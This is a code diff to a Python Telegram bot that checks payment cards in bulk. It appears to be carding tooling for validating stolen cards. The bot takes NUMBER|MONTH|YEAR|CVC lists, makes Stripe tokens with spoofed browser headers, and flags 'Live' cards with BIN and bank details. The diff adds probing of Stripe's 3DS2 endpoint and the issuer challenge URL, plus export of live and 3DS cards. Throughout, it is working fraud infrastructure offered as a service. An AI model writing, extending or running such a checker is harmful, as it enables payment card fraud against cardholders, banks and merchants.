@@ -140,7 +140,7 @@ class InputValidator:
         return cards
 
 class CardChecker:
-    """Enhanced card checker with better error handling and retries"""
+    """Enhanced card checker with 3DS detection"""
     
     def __init__(self):
         self.session = requests.Session()
@@ -335,7 +335,7 @@ class CardChecker:
             return False
 
     def create_stripe_token(self, card_number: str, exp_month: str, exp_year: str, cvc: str) -> Tuple[Optional[str], Optional[str]]:
-        """Enhanced Stripe token creation with better error handling"""
+        """Enhanced Stripe token creation"""
         try:
             # Generate unique identifiers
             muid = str(uuid.uuid4())
@@ -393,9 +393,116 @@ class CardChecker:
             return None, f"Network error: {str(e)}"
         except Exception as e:
             return None, f"Token creation error: {str(e)}"
+    
+    def check_3ds_authentication(self, token_id: str) -> Tuple[bool, Optional[str]]:
+        """Check if card requires 3DS and verify authentication"""
+        try:
+            # Call Stripe 3DS2 authenticate endpoint
+            auth_headers = {
+                'accept': 'application/json',
+                'content-type': 'application/x-www-form-urlencoded',
+                'origin': 'https://js.stripe.com',
+                'referer': 'https://js.stripe.com/',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+            }
+            
+            auth_data = {
+                'source': token_id,
+                'browser': json.dumps({
+                    'language': 'en-US',
+                    'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                    'java_enabled': False,
+                    'javascript_enabled': True,
+                    'color_depth': 24,
+                    'screen_height': 1080,
+                    'screen_width': 1920,
+                    'time_zone_offset': -120
+                })
+            }
+            
+            response = requests.post(
+                'https://api.stripe.com/v1/3ds2/authenticate',
+                headers=auth_headers,
+                data=auth_data,
+                timeout=30
+            )
+            
+            if response.status_code == 200:
+                resp_json = response.json()
+                
+                # Check if 3DS challenge is required
+                if resp_json.get('state') == 'challenge_required':
+                    creq = resp_json.get('creq')
+                    acs_url = resp_json.get('ares', {}).get('acsURL')
+                    
+                    if creq and acs_url:
+                        # Send creq to ACS URL
+                        return self._verify_3ds_challenge(creq, acs_url)
+                    
+                    return True, "3DS Challenge required ⚠️"
+                
+                elif resp_json.get('state') == 'succeeded':
+                    return False, None
+                
+                elif resp_json.get('state') == 'failed':
+                    return True, "3DS Authentication failed ❌"
+            
+            return False, None
+            
+        except Exception as e:
+            logger.warning(f"3DS check error: {e}")
+            return False, None
+    
+    def _verify_3ds_challenge(self, creq: str, acs_url: str) -> Tuple[bool, str]:
+        """Verify 3DS challenge by sending creq"""
+        try:
+            challenge_headers = {
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+                'accept-language': 'en-US,en;q=0.9',
+                'content-type': 'application/x-www-form-urlencoded',
+                'origin': 'https://js.stripe.com',
+                'referer': 'https://js.stripe.com/',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
+                'dnt': '1',
+                'sec-fetch-dest': 'iframe',
+                'sec-fetch-mode': 'navigate',
+                'sec-fetch-site': 'cross-site'
+            }
+            
+            challenge_data = {
+                'creq': creq
+            }
+            
+            response = requests.post(
+                acs_url,
+                headers=challenge_headers,
+                data=challenge_data,
+                timeout=30,
+                allow_redirects=True
+            )
+            
+            response_text = response.text
+            
+            # Check for authentication failure
+            if 'Authentication failed' in response_text or 'Authentication Failed' in response_text:
+                return True, "3DS Authentication Failed ❌"
+            
+            # Check for other failure indicators
+            if 'txnErrorParagraphDiv' in response_text or 'transFailure' in response_text:
+                return True, "3DS Challenge Failed ❌"
+            
+            # Check for success
+            if 'success' in response_text.lower() or 'authenticated' in response_text.lower():
+                return True, "3DS Passed ✅ (Manual verification required)"
+            
+            return True, "3DS Required ⚠️ (Manual verification needed)"
+            
+        except Exception as e:
+            logger.error(f"3DS challenge verification error: {e}")
+            return True, f"3DS Error: {str(e)}"
 
     def test_card(self, card_info: str) -> CardResult:
-        """Enhanced card testing with better error handling and response parsing"""
+        """Enhanced card testing with 3DS detection"""
         start_time = time.time()
         
         # Validate card format
@@ -449,6 +556,20 @@ class CardChecker:
                     bin_info=bin_info,
                     time_taken=round(time.time() - start_time, 2),
                     response=token_error or 'Token creation failed'
+                )
+            
+            # Check for 3DS authentication
+            is_3ds, three_ds_message = self.check_3ds_authentication(token_id)
+            
+            if is_3ds and three_ds_message:
+                return CardResult(
+                    card=card_info,
+                    status='3DS Required',
+                    message=three_ds_message,
+                    bin_info=bin_info,
+                    time_taken=round(time.time() - start_time, 2),
+                    response=three_ds_message,
+                    gateway_response='3D Secure Challenge'
                 )
 
             # Test card with gateway
@@ -602,6 +723,7 @@ class SessionManager:
                 'approved': 0,
                 'declined': 0,
                 'errors': 0,
+                'requires_3ds': 0,
                 'total': 0,
                 'cards': [],
                 'start_time': None,
@@ -657,6 +779,9 @@ class MessageFormatter:
         if result.status == 'Approved':
             status_emoji = "✅"
             status_text = "Live"
+        elif result.status == '3DS Required':
+            status_emoji = "🔐"
+            status_text = "3DS Required"
         elif result.status == 'Declined':
             status_emoji = "❌" 
             status_text = "Declined"
@@ -668,10 +793,10 @@ class MessageFormatter:
 ↯ [💳] 𝙲𝚊𝚛𝚍 ↯ {result.card}
 ↯ [{status_emoji}] 𝚂𝚝𝚊𝚝𝚞𝚜 ↯ [ {status_text}]
 [🎟️] 𝙼𝚎𝚜𝚜𝚊𝚐𝚎 ↯- [{result.message}]
-↯ [📟] 𝚋𝚒𝚗 ↯ {bin_info.scheme} - {bin_info.type} - {bin_info.brand}
-[🏦] 𝚋𝚊𝚗𝚔 ↯ {bin_info.bank}
+↯ [🔟] 𝚋𝚒𝚗 ↯ {bin_info.scheme} - {bin_info.type} - {bin_info.brand}
+[🦅] 𝚋𝚊𝚗𝚔 ↯ {bin_info.bank}
 [{bin_info.country_emoji}] 𝚌𝚘𝚞𝚗𝚝𝚛𝚢 ↯ {bin_info.country} [{bin_info.country_emoji}]
-↯ [🤓] 𝙶𝚊𝚝𝚎𝚠𝚊𝚢 ↯ Live Auth 🥷↯
+↯ [🤺] 𝙶𝚊𝚝𝚎𝚠𝚊𝚢 ↯ Live Auth 🥷↯
 [🕜] 𝚃𝚊𝚔𝚎𝚗 ↯ [ {result.time_taken}s ] || 𝚁𝚎𝚝𝚛𝚢 ↯- 0
 [❤️]𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝙱𝚢 ↯ @{bot.get_me().username} [PRO]
 [🥷] ミ★ 𝘖𝘸𝘯𝘦𝘳 ★彡 ↯ - {OWNER_NAME} - 🥷↯
@@ -704,14 +829,18 @@ class MessageFormatter:
         progress_bar = "█" * progress_filled + "░" * (10 - progress_filled)
         
         dashboard = f"""
+╭─────────────────────────╮
+│   🎯 CARD CHECKER PRO   │
+╰─────────────────────────╯
 
 🚀 **Progress:** {progress}/{total_cards} ({percentage:.1f}%)
-▓{progress_bar}▓ 
+▐{progress_bar}▌ 
 
 📈 **Statistics:**
 ├ 💳 **Total Checked:** {results['total']}
 ├ ✅ **Approved:** {results['approved']} ({success_rate:.1f}%)
 ├ ❌ **Declined:** {results['declined']}
+├ 🔐 **3DS Required:** {results['requires_3ds']}
 ├ ⚠️ **Errors:** {results['errors']}
 └ 📊 **Success Rate:** {success_rate:.1f}%
 
@@ -720,8 +849,8 @@ class MessageFormatter:
 ├ 🚄 **Speed:** {cards_per_minute:.1f} cards/min
 └ 🔄 **Status:** {'🟢 Active' if user_id in session_manager.threads and session_manager.threads[user_id].is_alive() else '⚪ Idle'}
 
-📧 **Session Info:**
-└ 🔐 **Account:** {session.get('email', 'Not logged in')}
+🔧 **Session Info:**
+└ 📧 **Account:** {session.get('email', 'Not logged in')}
 """
         
         return dashboard.strip()
@@ -757,8 +886,8 @@ class KeyboardManager:
         )
         
         keyboard.add(
-            telebot.types.InlineKeyboardButton(f"⚠️ Errors ({results['errors']})", callback_data=f"show_errors_{user_id}"),
-            telebot.types.InlineKeyboardButton(f"📋 All Cards ({results['total']})", callback_data=f"show_all_{user_id}")
+            telebot.types.InlineKeyboardButton(f"🔐 3DS ({results['requires_3ds']})", callback_data=f"show_3ds_{user_id}"),
+            telebot.types.InlineKeyboardButton(f"⚠️ Errors ({results['errors']})", callback_data=f"show_errors_{user_id}")
         )
         
         # Control buttons
@@ -814,7 +943,7 @@ class CardProcessor:
         # Initialize results
         results = self.session_manager.get_results(user_id)
         results.update({
-            'approved': 0, 'declined': 0, 'errors': 0, 'total': 0,
+            'approved': 0, 'declined': 0, 'errors': 0, 'requires_3ds': 0, 'total': 0,
             'cards': [], 'start_time': time.time(), 'end_time': None
         })
         
@@ -854,14 +983,14 @@ class CardProcessor:
                 
                 # Limit concurrent requests
                 if len(futures) >= MAX_THREADS:
-                    self._collect_results(user_id, futures[:MAX_THREADS])
+                    self._collect_results(user_id, futures[:MAX_THREADS], len(cards))
                     futures = futures[MAX_THREADS:]
                 
                 time.sleep(0.1)  # Small delay between submissions
             
             # Collect remaining results
             if futures and not self.session_manager.stop_flags.get(user_id, False):
-                self._collect_results(user_id, futures)
+                self._collect_results(user_id, futures, len(cards))
             
             # Mark completion
             results['end_time'] = time.time()
@@ -878,7 +1007,7 @@ class CardProcessor:
             if user_id in self.session_manager.threads:
                 del self.session_manager.threads[user_id]
     
-    def _collect_results(self, user_id: int, futures: List[Tuple]):
+    def _collect_results(self, user_id: int, futures: List[Tuple], total_cards: int):
         """Collect results from futures"""
         results = self.session_manager.get_results(user_id)
         
@@ -899,6 +1028,10 @@ class CardProcessor:
                         results['approved'] += 1
                         # Send live card immediately
                         self._send_live_card(user_id, result)
+                    elif result.status == '3DS Required':
+                        results['requires_3ds'] += 1
+                        # Send 3DS card notification
+                        self._send_3ds_card(user_id, result)
                     elif result.status == 'Declined':
                         results['declined'] += 1
                     else:
@@ -906,7 +1039,7 @@ class CardProcessor:
                 
                 # Update dashboard periodically
                 if results['total'] % 5 == 0:
-                    self._update_dashboard(user_id, len(futures))
+                    self._update_dashboard(user_id, total_cards)
                 
             except Exception as e:
                 logger.error(f"Result collection error: {e}")
@@ -921,6 +1054,14 @@ class CardProcessor:
             bot.send_message(user_id, formatted_result, parse_mode='Markdown')
         except Exception as e:
             logger.error(f"Failed to send live card: {e}")
+    
+    def _send_3ds_card(self, user_id: int, result: CardResult):
+        """Send 3DS card notification"""
+        try:
+            formatted_result = MessageFormatter.format_card_result(result, user_id)
+            bot.send_message(user_id, formatted_result, parse_mode='Markdown')
+        except Exception as e:
+            logger.error(f"Failed to send 3DS card: {e}")
     
     def _update_dashboard(self, user_id: int, total_cards: int):
         """Update dashboard message"""
@@ -955,7 +1096,8 @@ class CardProcessor:
 📊 **Final Results:**
 ├ 💳 **Total:** {results['total']} cards
 ├ ✅ **Approved:** {results['approved']} cards
-├ ❌ **Declined:** {results['declined']} cards  
+├ ❌ **Declined:** {results['declined']} cards
+├ 🔐 **3DS Required:** {results['requires_3ds']} cards
 ├ ⚠️ **Errors:** {results['errors']} cards
 └ ⏱️ **Time:** {int(elapsed_time)}s
 
@@ -987,6 +1129,9 @@ def handle_start(message):
     welcome_text = f"""
 👋 Welcome **{username}**!
 
+**🔐 Enhanced 3DS Detection**
+This bot now automatically detects and verifies 3D Secure authentication!
+
 **Owner:** {OWNER_NAME} ({OWNER_USERNAME})
 **Channel:** {OWNER_CHANNEL}
 
@@ -1007,7 +1152,7 @@ def handle_help(message):
 │      🆘 **HELP CENTER**      │
 ╰─────────────────────────╯
 
-**📝 How to Use:**
+**🔐 How to Use:**
 
 **1️⃣ Login:**
 - Click "🔐 Login" button
@@ -1021,8 +1166,13 @@ def handle_help(message):
 
 **3️⃣ Monitor Progress:**
 - View live results in dashboard
-- Track approved/declined/errors
+- Track approved/declined/3DS/errors
 - Stop processing anytime
+
+**🔐 3DS Detection:**
+- Automatically detects 3D Secure cards
+- Verifies authentication status
+- Shows specific failure reasons
 
 **📊 Dashboard Features:**
 - Real-time statistics
@@ -1042,6 +1192,7 @@ NUMBER|MONTH|YEAR|CVC
 - Use .txt files for bulk checking
 - Live cards appear instantly
 - Dashboard updates every 5 cards
+- 3DS cards are identified automatically
 
 **🆘 Support:** {OWNER_USERNAME}
 **📢 Updates:** {OWNER_CHANNEL}
@@ -1093,7 +1244,8 @@ def handle_text_input(message):
         # Confirmation message
         bot.reply_to(message, f"🚀 **Started processing {len(cards)} cards!**\n\n"
                              f"📊 View progress in dashboard above\n"
-                             f"✅ Live cards will appear automatically", 
+                             f"✅ Live cards will appear automatically\n"
+                             f"🔐 3DS cards will be detected", 
                     parse_mode='Markdown')
     else:
         bot.reply_to(message, f"❌ **Error:** {message_text}")
@@ -1179,7 +1331,8 @@ def handle_action_callbacks(call):
                 return
             
             bot.answer_callback_query(call.id)
-            instruction_text = """
+            instruction_text = f"""
+📋 **CARD CHECKING INSTRUCTIONS**
 
 **💡 Methods:**
 1️⃣ **Text Message:** Paste cards directly
@@ -1195,10 +1348,11 @@ def handle_action_callbacks(call):
 • Max {MAX_CARDS_PER_SESSION} cards per session
 • Live results appear instantly
 • Real-time dashboard updates
+• 🔐 Automatic 3DS detection
 • Export approved cards
 
 **🚀 Ready to check your cards!**
-""".format(MAX_CARDS_PER_SESSION=MAX_CARDS_PER_SESSION)
+"""
             
             bot.send_message(user_id, instruction_text, parse_mode='Markdown')
             
@@ -1316,7 +1470,8 @@ def process_password_input(message):
 
 📧 **Email:** `{email}`
 🕐 **Time:** {datetime.now().strftime('%H:%M:%S')}
-🔐 **Status:** Authenticated
+📍 **Status:** Authenticated
+🔐 **3DS Detection:** Enabled
 
 You can now check cards! 🚀
 """, user_id, login_msg.message_id, parse_mode='Markdown', 
@@ -1325,7 +1480,7 @@ You can now check cards! 🚀
                 bot.edit_message_text("❌ **Verification failed!**\n\nGoogle authentication unsuccessful.", 
                                      user_id, login_msg.message_id, parse_mode='Markdown')
         else:
-            bot.edit_message_text("❌ **Login failed!**\n\nInvalid email or password.", 
+                            bot.edit_message_text("❌ **Login failed!**\n\nInvalid email or password.", 
                                  user_id, login_msg.message_id, parse_mode='Markdown')
     
     except Exception as e:
@@ -1388,8 +1543,11 @@ def show_filtered_results(user_id: int, status_filter: str, call):
     elif status_filter == 'declined':
         filtered_cards = [c for c in results['cards'] if c.status == 'Declined']
         title = "❌ DECLINED CARDS"
+    elif status_filter == '3ds':
+        filtered_cards = [c for c in results['cards'] if c.status == '3DS Required']
+        title = "🔐 3DS REQUIRED CARDS"
     elif status_filter == 'errors':
-        filtered_cards = [c for c in results['cards'] if c.status not in ['Approved', 'Declined']]
+        filtered_cards = [c for c in results['cards'] if c.status not in ['Approved', 'Declined', '3DS Required']]
         title = "⚠️ ERROR CARDS"
     else:  # all
         filtered_cards = results['cards']
@@ -1415,7 +1573,15 @@ def show_filtered_results(user_id: int, status_filter: str, call):
 """
     
     for i, card_result in enumerate(display_cards, 1):
-        status_emoji = "✅" if card_result.status == 'Approved' else "❌" if card_result.status == 'Declined' else "⚠️"
+        if card_result.status == 'Approved':
+            status_emoji = "✅"
+        elif card_result.status == '3DS Required':
+            status_emoji = "🔐"
+        elif card_result.status == 'Declined':
+            status_emoji = "❌"
+        else:
+            status_emoji = "⚠️"
+            
         result_text += f"**{i}.** `{card_result.card}` {status_emoji}\n"
         result_text += f"    💬 {card_result.message}\n"
         if hasattr(card_result, 'time_taken'):
@@ -1454,6 +1620,10 @@ def export_results(user_id: int, export_type: str, call):
             cards_to_export = [card_result.card for card_result in results['cards'] if card_result.status == 'Approved']
             file_name = f"live_cards_{user_id}.txt"
             caption = "✅ Live Cards Export"
+        elif export_type == '3ds':
+            cards_to_export = [card_result.card for card_result in results['cards'] if card_result.status == '3DS Required']
+            file_name = f"3ds_cards_{user_id}.txt"
+            caption = "🔐 3DS Required Cards Export"
         else:  # export_all
             cards_to_export = [card_result.card for card_result in results['cards']]
             file_name = f"all_cards_{user_id}.txt"
@@ -1497,5 +1667,6 @@ def update_dashboard_message(user_id: int, message_id: int):
             bot.send_message(user_id, "❌ Dashboard update failed. Please try again.", parse_mode='Markdown')
 
 if __name__ == '__main__':
-    logger.info("Bot starting...")
+    logger.info("Bot starting with 3DS detection enabled...")
+    logger.info("Features: Card checking, BIN lookup, 3DS authentication verification")
     bot.polling(none_stop=True)
